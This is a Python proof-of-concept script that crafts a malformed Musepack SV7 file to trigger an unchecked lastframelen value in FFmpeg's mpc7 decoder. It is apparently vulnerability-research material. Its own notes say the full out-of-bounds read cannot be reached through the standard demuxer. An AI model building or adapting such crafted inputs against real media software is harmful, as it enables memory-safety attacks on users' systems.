#!/usr/bin/env python3
"""
PoC generator for VULN-001: mpc7 lastframelen Heap OOB Read via Unchecked nb_samples
File: libavcodec/mpc7.c

This script crafts a Musepack SV7 (.mpc) file that encodes lastframelen=2047
(0x7FF) in the extradata — well above MPC_FRAME_SIZE=1152. The decoder stores
this unchecked value in c->lastframelen (line 111 of mpc7.c).

Trigger chain:
  1. mpc7_decode_init() reads 11-bit lastframelen at bit offset 97 from bswapped
     extradata — yields 2047, which is NOT range-checked against MPC_FRAME_SIZE.
  2. ff_get_buffer() allocates the AVFrame for exactly MPC_FRAME_SIZE=1152 samples.
  3. At line 280-281: if(last_frame) frame->nb_samples = c->lastframelen; → 2047.
  4. Downstream output code reads 2047 samples from a 1152-sample buffer → OOB.

Limitation (see vuln_001_notes.md):
  The last_frame flag (pkt->data[1]) is computed by the MPC demuxer as:
    (c->curframe > c->fcount) && c->fcount
  Due to the EOF guard at the top of mpc_read_packet() (returns EOF when
  curframe >= fcount for nonzero fcount), curframe can never exceed fcount during
  a valid decode, so pkt->data[1] is always 0. The full OOB path is not reachable
  via the stock MPC file demuxer. This PoC demonstrates the unchecked extradata
  parsing and the vulnerable lastframelen storage.

Extradata bit layout (after bswap_buf in mpc7_decode_init):
  The codec does bswap_buf on 16 bytes (4 uint32 LE words) then init_get_bits.
  In the resulting byte array:
    buf[0]  = extradata[3]   bits  0-7   IS, MSS, maxbands[5:0]
    buf[1]  = extradata[2]   bits  8-15  (skipped)
    ...
    buf[12] = extradata[15]  bits 96-103 gapless + upper 7 bits of lastframelen
    buf[13] = extradata[14]  bits 104-111 lower 4 bits of lastframelen + 4 unused

  lastframelen (11 bits, read MSB-first at bit offset 97):
    = (extradata[15] & 0x7F) << 4 | (extradata[14] >> 4) & 0x0F

  For lastframelen = 2047 = 0x7FF:
    extradata[15] = 0x7F  (gapless=0, upper 7 bits=0x7F)
    extradata[14] = 0xF0  (lower 4 bits=0xF, rest=0)
"""

import struct
import os

OUTPUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_001_input.mpc")


def build_extradata():
    """
    Build 16-byte extradata with:
      IS=0, MSS=0, maxbands=0 (safe, < BANDS=32)
      gapless=0
      lastframelen=2047 (> MPC_FRAME_SIZE=1152, triggers the vulnerability)
      sample_rate = mpc_rate[extradata[2] & 3] = mpc_rate[0] = 44100 Hz
    """
    ed = bytearray(16)
    # extradata[3] = e3: IS=0, MSS=0, maxbands=0 -> 0x00
    ed[3] = 0x00
    # extradata[2] = e2: sample rate index bits[1:0] = 0 -> 44100 Hz
    ed[2] = 0x00
    # All skipped bits (ed[0,1,4..13]) stay 0x00
    # extradata[14] = e14: lower 4 bits of lastframelen=0xF in bits [7:4] -> 0xF0
    ed[14] = 0xF0
    # extradata[15] = e15: gapless=0 in bit7, upper 7 bits of lastframelen=0x7F -> 0x7F
    ed[15] = 0x7F
    return bytes(ed)


def build_frame():
    """
    Build a minimal MPC SV7 audio frame (8 bytes).

    MPC demuxer reads the frame start to extract size2 (20-bit audio bit count):
      c->curbits = 8 (set in mpc_read_header)
      tmp = avio_rl32(file)          -- reads 4 bytes LE from frame start
      size2 = (tmp >> (12-8)) & 0xFFFFF = (tmp >> 4) & 0xFFFFF

    For size2=5:
      tmp = 0x00000050 -> LE bytes [0x50, 0x00, 0x00, 0x00]

    Frame byte size:
      size = ((size2 + curbits + 31) & ~31) >> 3
           = ((5 + 28 + 31) & ~31) >> 3
           = (64 & ~31) >> 3 = 8 bytes

    Packet layout (pkt->data):
      [0] = curbits = 28    (skip bits for decoder)
      [1] = last_frame = 0  (computed by demuxer; always 0 via normal path)
      [2] = 0
      [3] = 0
      [4..11] = these 8 frame bytes (re-read after demuxer seeks back to pos)

    Decoder check (non-last-frame):
      bits_used  = 28 (skip) + 4 + 4 (res[0], res[1] with maxbands=0) = 36
      bits_avail = 8 * 8 = 64
      Condition: bits_avail < bits_used  (64<36 = F)
             OR  bits_used + 32 <= bits_avail  (68<=64 = F)
      -> Check passes, decode succeeds.
    """
    frame_size_word = struct.pack('<I', 0x00000050)  # encodes size2=5
    frame_audio = b'\x00' * 4                        # zero payload
    return frame_size_word + frame_audio


def main():
    # MPC SV7 file header
    magic = b'MP+'
    version = bytes([0x07])          # SV7
    fcount = struct.pack('<I', 1)    # 1 declared frame

    extradata = build_extradata()
    frame = build_frame()

    data = magic + version + fcount + extradata + frame

    with open(OUTPUT, 'wb') as f:
        f.write(data)

    # Verify the lastframelen encoding
    e14 = extradata[14]
    e15 = extradata[15]
    lastframelen = ((e15 & 0x7F) << 4) | ((e14 >> 4) & 0x0F)

    print(f"[+] Written: {OUTPUT}  ({len(data)} bytes)")
    print(f"[+] Extradata (hex): {extradata.hex()}")
    print(f"[+] Decoded lastframelen = {lastframelen}  (MPC_FRAME_SIZE=1152)")
    if lastframelen > 1152:
        print(f"[+] lastframelen > MPC_FRAME_SIZE: VULNERABLE extradata confirmed")
    else:
        print(f"[-] WARNING: lastframelen <= 1152, no OOB expected")
    print()
    print("[!] NOTE: last_frame (pkt->data[1]) is always 0 from the standard MPC")
    print("    demuxer. The nb_samples overwrite at mpc7.c:281 is not reached.")
    print("    See vuln_001_notes.md for full analysis.")


if __name__ == '__main__':
    main()
